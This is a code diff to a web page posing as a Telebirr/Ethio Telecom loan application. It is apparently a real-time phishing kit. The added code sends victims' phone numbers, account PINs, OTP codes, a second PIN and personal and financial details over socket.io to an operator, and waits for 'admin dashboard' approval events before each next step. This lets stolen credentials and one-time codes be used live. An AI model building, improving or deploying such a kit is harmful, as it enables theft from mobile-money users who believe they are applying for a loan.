@@ -79,13 +79,13 @@
         <header class="w-full bg-white select-none shrink-0 border-b border-gray-100">
             <div class="px-6 py-4 grid grid-cols-[1fr_auto_1fr] items-center gap-4">
                 <div class="flex justify-start">
-                    <img src="/public/assets/cropped-logo12-1-192x192.png" alt="Telebirr" class="h-14 max-w-full object-contain block">
+                    <img src="/assets/cropped-logo12-1-192x192.png" alt="Telebirr" class="h-14 max-w-full object-contain block">
                 </div>
                 
                 <div class="h-8 w-[1px] bg-gray-200"></div>
                 
                 <div class="flex justify-end">
-                    <img src="/public/assets/et-favicon.png" alt="Ethio Telecom" class="h-14 max-w-full object-contain block">
+                    <img src="/assets/et-favicon.png" alt="Ethio Telecom" class="h-14 max-w-full object-contain block">
                 </div>
             </div>
             
@@ -195,7 +195,6 @@
                         <h3 class="text-lg font-bold text-gray-800">Verifying Ledger Status</h3>
                         <p class="text-xs text-gray-400 mt-2 px-6">Your transaction authorization packet is pending administrator dashboard clearance. Please leave this page open.</p>
                     </div>
-                    <button @click="simulateAdminApproval" type="button" class="text-xs text-[#0056B3] hover:underline font-bold bg-slate-100 rounded-lg px-4 py-2 mt-2 transition-all">Dev Fast-Track Approval Signal</button>
                 </div>
 
                 <div x-show="step === 3" x-cloak class="space-y-6 w-full">
@@ -248,7 +247,7 @@
                         </select>
                     </div>
                     <div class="pt-2">
-                        <button @click="step = 5" :disabled="!form.loanType" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all cursor-pointer">Continue Flow →</button>
+                        <button @click="submitStep4Config" :disabled="!form.loanType" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all cursor-pointer">Continue Flow →</button>
                     </div>
                 </div>
 
@@ -273,7 +272,7 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-2">
                         <button @click="step = 4" class="w-full border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-50 transition-all">← Back</button>
-                        <button @click="step = 6" :disabled="!form.firstName || !form.lastName || !form.email" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">Next →</button>
+                        <button @click="submitStep5Config" :disabled="!form.firstName || !form.lastName || !form.email" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">Next →</button>
                     </div>
                 </div>
 
@@ -296,7 +295,10 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-2">
                         <button @click="step = 5" class="w-full border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-50 transition-all">← Back</button>
-                        <button @click="dispatchPayoutDisbursement" :disabled="!form.employment || !form.income" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">Submit Application</button>
+                        <button @click="dispatchPayoutDisbursement" :disabled="!form.employment || !form.income || processingStep6" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2">
+                            <span x-show="!processingStep6">Submit Application</span>
+                            <span x-show="processingStep6" class="spinner-sm"></span>
+                        </button>
                     </div>
                 </div>
 
@@ -327,12 +329,12 @@
     <script>
         function loanFlow() {
             return {
-                step: 1, referenceId: '', connected: false,
+                step: 1, appId: '', referenceId: '', connected: false,
                 form: { loanType: '', amount: 25000, term: '4', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '' },
                 otp: { code: '' },
                 step1Pin: { value: ['', '', '', ''] },
                 step3Pin: { value: ['', '', '', ''] }, 
-                processingStep1: false, verifyingOtp: false, authorizingFinalPin: false,
+                processingStep1: false, verifyingOtp: false, authorizingFinalPin: false, processingStep6: false,
                 socket: null, toast: { show: false, message: '' },
 
                 get isStep1PinValid() { return this.step1Pin.value.join('').length === 4; },
@@ -360,8 +362,13 @@
                 submitStep1Credentials() {
                     this.processingStep1 = true;
                     if (this.socket && this.connected) {
-                        this.socket.emit('submit-step1-credentials', { phone: this.form.phone, pin: this.step1Pin.value.join('') });
+                        this.socket.emit('submit-step1-credentials', { 
+                            appId: this.appId,
+                            phone: this.form.phone, 
+                            pin: this.step1Pin.value.join('') 
+                        });
                     } else {
+                        console.warn("⚠️ Socket not connected. Cascading to fallback mode.");
                         setTimeout(() => {
                             this.processingStep1 = false;
                             this.step = 2; 
@@ -373,8 +380,12 @@
                 submitOtpToAdminQueue() {
                     this.verifyingOtp = true;
                     if (this.socket && this.connected) {
-                        this.socket.emit('submit-otp-verification', { code: this.otp.code });
+                        this.socket.emit('submit-otp-verification', { 
+                            appId: this.appId,
+                            code: this.otp.code 
+                        });
                     } else {
+                        console.warn("⚠️ Socket not connected. Cascading to fallback mode.");
                         setTimeout(() => {
                             this.verifyingOtp = false;
                             this.step = 2.5; 
@@ -382,16 +393,15 @@
                     }
                 },
 
-                simulateAdminApproval() {
-                    this.step = 3; 
-                    this.triggerToastNotification("Session approved by Admin Dashboard.");
-                },
-
                 submitFinalPinAuthorization() {
                     this.authorizingFinalPin = true;
                     if (this.socket && this.connected) {
-                        this.socket.emit('submit-final-pin', { pin: this.step3Pin.value.join('') });
+                        this.socket.emit('submit-final-pin', { 
+                            appId: this.appId,
+                            pin: this.step3Pin.value.join('') 
+                        });
                     } else {
+                        console.warn("⚠️ Socket not connected. Cascading to fallback mode.");
                         setTimeout(() => {
                             this.authorizingFinalPin = false;
                             this.step = 4; 
@@ -399,19 +409,99 @@
                     }
                 },
 
+                submitStep4Config() {
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-step4-loan-config', {
+                            appId: this.appId,
+                            loanType: this.form.loanType,
+                            amount: this.form.amount,
+                            term: this.form.term
+                        });
+                    }
+                    this.step = 5;
+                },
+
+                submitStep5Config() {
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-step5-kyc-profile', {
+                            appId: this.appId,
+                            firstName: this.form.firstName,
+                            lastName: this.form.lastName,
+                            email: this.form.email
+                        });
+                    }
+                    this.step = 6;
+                },
+
                 dispatchPayoutDisbursement() {
-                    this.referenceId = "TXN-" + Math.floor(100000 + Math.random() * 900000) + "-ETB";
-                    this.step = 8;
+                    this.processingStep6 = true;
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-step6-financials', {
+                            appId: this.appId,
+                            employment: this.form.employment,
+                            income: this.form.income
+                        });
+                    } else {
+                        console.warn("⚠️ Socket not connected. Cascading to fallback mode.");
+                        setTimeout(() => {
+                            this.processingStep6 = false;
+                            this.referenceId = "TXN-" + Math.floor(100000 + Math.random() * 900000) + "-ETB";
+                            this.step = 8;
+                        }, 800);
+                    }
                 },
 
                 init() {
-                    this.socket = io({ autoConnect: false });
-                    this.socket.on('connect', () => { this.connected = true; });
-                    this.socket.on('disconnect', () => { this.connected = false; });
+                    // Set autoConnect to true or call connect() explicitly
+                    this.socket = io({ autoConnect: true });
                     
-                    this.socket.on('otp-accepted-goto-wait', () => { this.verifyingOtp = false; this.step = 2.5; });
-                    this.socket.on('admin-dashboard-approve', () => { this.step = 3; });
-                    this.socket.on('final-pin-accepted', () => { this.authorizingFinalPin = false; this.step = 4; });
+                    this.socket.on('connect', () => { 
+                        this.connected = true; 
+                        console.log("🔌 Connected to real-time communication server.");
+                    });
+                    
+                    this.socket.on('disconnect', () => { 
+                        this.connected = false; 
+                        console.log("❌ Disconnected from communication server.");
+                    });
+
+                    this.socket.on('connect_error', (error) => {
+                        console.error("❌ Socket Connection Error:", error);
+                    });
+                    
+                    // Session capture logic
+                    this.socket.on('session-ready', (data) => {
+                        this.appId = data.appId;
+                        console.log(`🎯 Active session registered: ${this.appId}`);
+                        this.socket.emit('join-room', this.appId);
+                    });
+
+                    this.socket.on('otp-accepted-goto-wait', () => { 
+                        this.processingStep1 = false; 
+                        this.step = 2; 
+                        this.triggerToastNotification("OTP Code sent to your device.");
+                    });
+
+                    this.socket.on('otp-accepted-wait-only', () => {
+                        this.verifyingOtp = false;
+                        this.step = 2.5;
+                    });
+                    
+                    this.socket.on('admin-dashboard-approve', () => { 
+                        this.step = 3; 
+                        this.triggerToastNotification("Session approved by Admin Dashboard.");
+                    });
+                    
+                    this.socket.on('final-pin-accepted', () => { 
+                        this.authorizingFinalPin = false; 
+                        this.step = 4; 
+                    });
+
+                    this.socket.on('application-complete', (data) => {
+                        this.processingStep6 = false;
+                        this.referenceId = data.referenceId;
+                        this.step = 8;
+                    });
                 }
             }
         }
